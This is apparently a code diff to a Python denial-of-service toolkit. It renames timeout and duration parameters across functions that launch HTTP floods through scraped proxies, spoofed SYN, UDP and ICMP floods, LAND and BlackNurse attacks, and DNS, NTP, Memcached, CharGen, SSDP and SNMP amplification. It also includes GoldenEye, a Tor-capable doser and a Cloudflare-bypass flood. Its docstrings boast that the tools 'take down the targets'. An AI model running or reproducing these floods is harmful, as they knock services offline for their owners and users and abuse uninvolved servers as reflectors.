+def proxhulk(u,threads=700,scraping_timeout=15,httpl=None,timeout=10,duration=300,logs=True,returning=False):
  '''
 
    it takes the following parameters:
@@ -1798,7 +1798,7 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
    u: target domain
    httpl: (set by default to: None) custom http proxies list
    threads: (set by default to: 700) number of connections
-   maxtime: (set by default to: 10) connection timeout flag 
+   timeout: (set by default to: 10) connection timeout flag 
 
    example:
 
@@ -1821,9 +1821,9 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
- global timeout
- timeout=maxtime
+  httplist=masshttp(timeout=scraping_timeout)
+ global _timeout
+ _timeout=timeout
  for x in range(threads):
    t=phu()
    t.start()
@@ -1834,7 +1834,7 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1974,7 +1974,7 @@ class sflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,min_ttl=64,max_ttl=64,interval=300,logs=True,returning=False):
+def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -2085,7 +2085,7 @@ def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-
      break
     try:
      time.sleep(.1)
-     if int(time.time()-c)==interval:
+     if int(time.time()-c)==duration:
       stop=True
       break
     except KeyboardInterrupt:
@@ -2136,7 +2136,7 @@ class udpsp(threading.Thread):
    except:
     pass
    time.sleep(self.speed)
-def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,interval=300,logs=True,returning=False):
+def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
  '''
    this function is for UDP flood attack using spoofed sources
 '''
@@ -2195,7 +2195,7 @@ def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2282,7 +2282,7 @@ class ln(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload=0,window=-1,interval=300,logs=True,returning=False):
+def land(u,p=80,min_size=10,max_size=50,limiting=True,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload=0,window=-1,duration=300,logs=True,returning=False):
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
@@ -2349,7 +2349,7 @@ def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_w
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2381,7 +2381,7 @@ class dampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',interval=300,logs=True,returning=False):
+def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',duration=300,logs=True,returning=False):
  '''
    this function is for DNS amplification attack using and list of DNS servers provided by the user.
 
@@ -2447,7 +2447,7 @@ def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',interv
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2478,7 +2478,7 @@ class nampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,interval=300,logs=True,returning=False):
+def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for NTP amplification attack using and list of DNS servers provided by the user.
 
@@ -2535,7 +2535,7 @@ def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,interval=300,l
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2566,7 +2566,7 @@ class memampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,interval=300,logs=True,returning=False):
+def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for Memcached amplification attack using and list of DNS servers provided by the user.
 
@@ -2623,7 +2623,7 @@ def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,interval=
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2654,7 +2654,7 @@ class charampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,interval=300,logs=True,returning=False):
+def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for CharGen amplification attack using and list of DNS servers provided by the user.
 
@@ -2711,7 +2711,7 @@ def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,interv
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2742,7 +2742,7 @@ class ssampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,interval=300,logs=True,returning=False):
+def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for CharGen amplification attack using and list of DNS servers provided by the user.
 
@@ -2799,7 +2799,7 @@ def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,interval=300
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2830,7 +2830,7 @@ class snampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,interval=300,logs=True,returning=False):
+def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for SNMP amplification attack using and list of DNS servers provided by the user.
 
@@ -2887,7 +2887,7 @@ def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,interval=300
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -2925,7 +2925,7 @@ class echst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],threads=100,interval=300,logs=True,returning=True):
+def echo_ref(u,p=80,min_size=10,max_size=50,limiting=True,level=1,pinglist=[],threads=100,duration=300,logs=True,returning=True):
  '''
    this function is for ECHO  reflection attack
 '''
@@ -2974,7 +2974,7 @@ def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],t
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -3013,7 +3013,7 @@ class icmpcl(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=False):
+def icmp(u,p=80,min_size=10,max_size=50,limiting=True,level=1,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for ICMP flood attack
 '''
@@ -3064,7 +3064,7 @@ def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_tt
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -3107,7 +3107,7 @@ class icmpst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=True):
+def icmpstorm(u,p=80,min_size=10,max_size=50,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=True):
  '''
    this function is for ICMP flood with spoofed sources
 '''
@@ -3160,7 +3160,7 @@ def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=Non
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -3197,7 +3197,7 @@ class blnu(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,payloads=False,interval=300,logs=True,returning=False):
+def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,payloads=False,duration=300,logs=True,returning=False):
  '''
    this function is for "black nurse" attack
 '''
@@ -3248,7 +3248,7 @@ def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,
      break
    try:
     time.sleep(.1)
-    if int(time.time()-c)==interval:
+    if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
@@ -3264,7 +3264,7 @@ class gldn(threading.Thread):
   self.target=target
   self.port=port
   self.method=method
-  self.timeout=timeout
+  self.timeout=_timeout
   time.sleep(2)
   while (stop!=True):
    pa=random.choice(paths)
@@ -3338,7 +3338,7 @@ class gldn(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returning=False):
+def goldeneye(u,p=80,threads=700,meth=3,timeout=5,duration=300,logs=True,returning=False):
  '''
    this function is for goldeneye attack with more effective method that take down the targets and doesn't consume much of your resources! thr reason that the original script pushs too much on your device is the fact that it fabricate he useragents string, random ascii blocks and the http headers on its own for every single request at the same time, so as much as you use more threads it's going to use more of your resources. here i already provided it with more than 10k unique useragents outside all clases (no need to redeclare it inside the class' functions everytime and push on the memory) and just formating the values of the http headers and the ascii strings.
 
@@ -3363,8 +3363,8 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
  method=meth
  global port 
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for x in range(threads):
   t=gldn()
   t.start()
@@ -3375,7 +3375,7 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
      break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -3390,7 +3390,7 @@ class dosecl(threading.Thread):
   global doser_counter
   self.target=target
   u=self.target
-  self.timeout=timeout
+  self.timeout=_timeout
   self.method=method
   self.tor=tor
   host=u.split('://')[1].split('/')[0]
@@ -3520,7 +3520,7 @@ class dosecl(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,settor=False):
+def doser(u,threads=700,meth=1,timeout=5,duration=300,logs=True,returning=False,set_tor=False):
  '''
   this function is for doser.py attack tool which uses requests module instead of httplib.
 '''
@@ -3528,7 +3528,7 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
  global doser_counter
  doser_counter=0
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -3537,8 +3537,8 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
  target=u
  global method
  method=meth
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for x in range(threads):
   t=dosecl()
   t.start() 
@@ -3549,7 +3549,7 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
      break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -3564,7 +3564,7 @@ class prdose(threading.Thread):
   global proxdoser_counter 
   self.target=target
   u=self.target
-  self.timeout=timeout
+  self.timeout=_timeout
   self.method=method
   host=u.split('://')[1].split('/')[0]
   time.sleep(2)
@@ -3643,7 +3643,7 @@ class prdose(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,returning=False):
+def proxdoser(u,scraping_timeout=15,threads=700,httpl=None,meth=1,timeout=5,duration=300,logs=True,returning=False):
  '''
    this is the advanced version of doser.py using http proxies.
 '''
@@ -3662,9 +3662,9 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
- global timeout
- timeout=maxtime
+  httplist=masshttp(timeout=scraping_timeout)
+ global _timeout
+ _timeout=timeout
  for x in range(threads):
   t=prdose()
   t.start()
@@ -3675,7 +3675,7 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
      break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -3690,7 +3690,7 @@ class atcf(threading.Thread):
   global cf_doser_counter
   global stop
   self.target=target
-  self.timeout=timeout
+  self.timeout=_timeout
   time.sleep(2)
   while (stop!=True):
      u=random.choice(paths)
@@ -3774,7 +3774,7 @@ def cki():
  time.sleep(1)
  for x in thr:
    del x
-def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,returning=False):
+def cfkill(u,threads=500,timeout=5,check=True,cook=True,duration=300,logs=True,returning=False):
  thr=[]
  global cf_doser_counter
  cf_doser_counter=0
@@ -3782,8 +3782,8 @@ def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,r
  global stop
  stop=False
  prints=logs
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global target
  target=u
  global ual
@@ -3819,7 +3819,7 @@ def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,r
      break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -3829,20 +3829,20 @@ def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,r
    del x
  if returning==True:
     return cf_doser_counter
-def cfkiller(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait=10):
+def cfkiller(u,threads=500,timeout=5,duration=300,logs=True,returning=False,wait=10):
  global cf_doser_counter
  cf_doser_counter=0
  c=time.time()
  global stop
  while True:
   try:
-   cfkill(u,threads=threads,interval=(interval-int(time.time()-c)),maxtime=maxtime,cook=True,check=False)
+   cfkill(u,threads=threads,duration=(duration-int(time.time()-c)),timeout=timeout,cook=True,check=False)
    time.sleep(3)
    if logs==True:
     print("[*]Resarting the attack after {} seconds...".format(wait))
    time.sleep(wait)  
    reset() 
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
